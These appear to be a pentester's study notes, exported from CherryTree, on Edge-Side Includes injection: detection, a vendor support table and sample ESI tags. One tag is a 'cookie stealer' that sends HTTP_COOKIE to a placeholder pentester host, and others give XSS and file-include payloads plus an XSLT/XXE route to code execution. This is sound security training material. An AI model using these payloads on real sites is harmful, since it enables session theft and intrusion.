<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Edge-Side Includes Injection (ESI)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Edge-Side Includes Injection (ESI)</h1><br/><br /><strong>What are Edge Side Includes(ESI)</strong><br />• Edge Side Includes (ESI) is an XML-based markup language that allow <span style="color:#d14646;">dynamic web content</span> assembly at the edge of the network (Content Delivery Network, User&#39;s Browser, or Reverse Proxy) by instructing the page processor what needs to be done to complete page assembly through ESI element tags (XML tags).<br />• ESI tags are used to instruct an HTTP surrogate (reverse-proxy, caching server, etc.) to <span style="color:#d14646;">fetch additional information regarding a web page</span> with <span style="color:#3cdaec;">an already cached template</span>. This information may come from another server before rendering the web page to the end-user. ESI enable fully cached web pages to include dynamic content.<br />    <a href=""><img src="images/2554-1.png" alt="images/2554-1.png" /></a><br /><br /><strong>How Detect ESI Injections</strong><br />• Edge-Side Include Injection occurs malicious <span style="text-decoration:underline;">ESI tags are reflected in the HTTP Response</span><br />   ◇ The root cause of this vulnerability is that HTTP surrogates cannot validate the ESI tag origin. <br />   ◇ HTTP surrogates parse and evaluate both:<br />      ▪ legitimate ESI tags by the upstream server<br />      ▪ malicious ESI tags by an attacker<br />• How identify the use of ESI:<br />   ◇  by inspecting response headers in search for Surrogate-Control: content=&quot;ESI/1.0&quot;<br />   ◇  use a blind attack approach to detect if ESI is in use or not<br />      ▪ use ESI tags to HTTP requests to see if any intermediary proxy is parsing the request and if ESI Injection is possible <br /><br /><strong>ESI Tags</strong><br /><div class="codebox"><pre>// Basic detection<br />&lt;esi: include src=http://&lt;PENTESTER IP&gt;&gt;<br /><br />// XSS Exploitation Example<br />&lt;esi: include src=http://&lt;PENTESTER IP&gt;/&lt;XSSPAYLOAD.html&gt;&gt;<br /><br />// Cookie Stealer (bypass httpOnly flag)<br />&lt;esi: include src=http://&lt;PENTESTER IP&gt;/?cookie_stealer.php?=$(HTTP_COOKIE)&gt;<br /><br />// Introduce private local files (Not LFI per se)<br />&lt;esi:include src=&quot;supersecret.txt&quot;&gt;<br /><br />// Valid for Akamai, sends debug information in the response<br />&lt;esi:debug/&gt;<br /></pre></div><br /><a href=""><img src="images/2554-2.png" alt="images/2554-2.png" /></a><br /><br /><strong>RCE with ESI Injections</strong><br />1. If the application processing ESI directives supports XSLT (a dynamic language used to transform XML files), we can achieve remote code execution<br />2. In that case, we can pass <code>dca=xslt</code> to the payload. <br />3. The XML file selected will be processed with the possibility of performing XML External Entity Injection Attacks (XXE) with some limitations<br /><br /><br /><strong>ESI Injections Attacks with different ESI-capable software</strong><br />GoSecure (<a href="https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/">https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/</a>) has created a table to help us understand possible attacks that we can try against different ESI-capable software, depending on the functionality supported. <br /><table class="table"><tr><th>Software</th><th>Includes</th><th>Vars</th><th>Cookies</th><th>Upstream Headers Required</th><th>Host Whitelist</th></tr><tr><td>Squid3</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td></tr><tr><td>Varnish Cache</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td></tr><tr><td>Fastly</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>Yes</td></tr><tr><td>Akamai ESI Test Server (ETS)</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td></tr><tr><td>NodeJS esi</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td></tr><tr><td>NodeJS nodesi</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>Optional</td></tr></table><br /><span style="text-decoration:underline;">Columns name explanation</span>:<br />   ◇ Includes: Supports the &lt;esi:includes&gt; directive<br />   ◇ Vars: Supports the &lt;esi:vars&gt; directive. Useful for bypassing XSS Filters<br />   ◇ Cookie: Document cookies are accessible to the ESI engine<br />   ◇ Upstream Headers Required: Surrogate applications will not process ESI statements unless the upstream application provides the headers<br />   ◇ Host Allowlist: In this case, ESI includes are only possible from allowed server hosts, making SSRF, for example, only possible against those hosts<br /><br /><strong>Bibliography:</strong><br />• <a href="https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/">https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/</a><br />• <a href="https://academy.hackthebox.com/module">https://academy.hackthebox.com</a></div>
</body>
</html>
